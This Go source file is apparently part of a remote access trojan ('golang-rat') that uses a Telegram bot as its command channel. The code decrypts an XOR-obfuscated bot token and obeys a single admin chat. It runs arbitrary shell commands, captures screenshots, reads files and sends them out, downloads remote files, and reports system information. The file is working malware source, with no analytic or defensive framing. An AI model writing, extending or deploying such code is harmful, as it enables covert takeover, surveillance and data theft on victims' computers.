package transport

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"github.com/redteam/golang-rat/internal/commands"
	"github.com/redteam/golang-rat/internal/utils"
)

type Agent struct {
	bot         *tgbotapi.BotAPI
	adminChatID int64
}

func NewAgent(encryptedToken []byte, key []byte, adminChatID int64) (*Agent, error) {
	token := string(utils.XOR(encryptedToken, key))
	bot, err := tgbotapi.NewBotAPI(token)
	if err != nil {
		return nil, err
	}

	return &Agent{
		bot:         bot,
		adminChatID: adminChatID,
	}, nil
}

func (a *Agent) Start() {
	u := tgbotapi.NewUpdate(0)
	u.Timeout = 60

	updates := a.bot.GetUpdatesChan(u)

	for update := range updates {
		if update.Message == nil {
			continue
		}

		if update.Message.Chat.ID != a.adminChatID {
			continue
		}

		go a.handleCommand(update.Message)
	}
}

func (a *Agent) handleCommand(msg *tgbotapi.Message) {
	text := msg.Text
	args := strings.Split(text, " ")
	cmd := args[0]

	switch cmd {
	case "/exec":
		if len(args) < 2 {
			a.reply(msg.Chat.ID, "Usage: /exec <cmd>")
			return
		}
		output, err := commands.ExecCommand(strings.Join(args[1:], " "))
		if err != nil {
			a.reply(msg.Chat.ID, fmt.Sprintf("Error executing command: %v\nOutput: %s", err, output))
		} else {
			a.reply(msg.Chat.ID, output)
		}

	case "/screen":
		imgData, err := commands.CaptureScreen()
		if err != nil {
			a.reply(msg.Chat.ID, fmt.Sprintf("Error capturing screen: %v", err))
			return
		}
		photo := tgbotapi.NewPhoto(msg.Chat.ID, tgbotapi.FileBytes{Name: "screenshot.png", Bytes: imgData})
		a.bot.Send(photo)

	case "/upload":
		if len(args) < 2 {
			a.reply(msg.Chat.ID, "Usage: /upload <path>")
			return
		}
		path := args[1]
		fileData, err := os.ReadFile(path)
		if err != nil {
			a.reply(msg.Chat.ID, fmt.Sprintf("Error reading file: %v", err))
			return
		}
		doc := tgbotapi.NewDocument(msg.Chat.ID, tgbotapi.FileBytes{Name: filepath.Base(path), Bytes: fileData})
		a.bot.Send(doc)

	case "/download":
		if len(args) < 3 {
			a.reply(msg.Chat.ID, "Usage: /download <url> <dest>")
			return
		}
		url := args[1]
		dest := args[2]
		err := commands.DownloadFile(url, dest)
		if err != nil {
			a.reply(msg.Chat.ID, fmt.Sprintf("Error downloading file: %v", err))
		} else {
			a.reply(msg.Chat.ID, "File downloaded successfully to "+dest)
		}

	case "/info":
		info, err := commands.GetSystemInfo()
		if err != nil {
			a.reply(msg.Chat.ID, fmt.Sprintf("Error getting system info: %v", err))
		} else {
			a.reply(msg.Chat.ID, info)
		}

	case "/help":
		a.reply(msg.Chat.ID, "Available commands:\n/exec <cmd>\n/screen\n/upload <path>\n/download <url> <dest>\n/info")
	}
}

func (a *Agent) reply(chatID int64, text string) {
	if len(text) > 4000 {
		text = text[:4000] + "..."
	}
	msg := tgbotapi.NewMessage(chatID, text)
	a.bot.Send(msg)
}
